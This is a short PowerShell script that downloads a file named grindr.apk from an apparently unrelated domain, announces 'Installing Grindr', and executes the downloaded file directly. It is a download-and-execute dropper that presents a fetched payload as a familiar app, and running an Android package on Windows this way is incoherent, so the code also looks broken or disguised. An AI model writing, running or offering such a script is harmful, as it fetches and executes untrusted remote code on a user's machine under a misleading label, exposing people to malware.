
$source = 'http://jobstestpreparation.com/grindr.apk'
$destination = 'grindr.apk'
Start-BitsTransfer -Source $source -Destination $destination 
Write-Output "Installing Grindr"
& '.\grindr.apk'
timeout /t 300

pause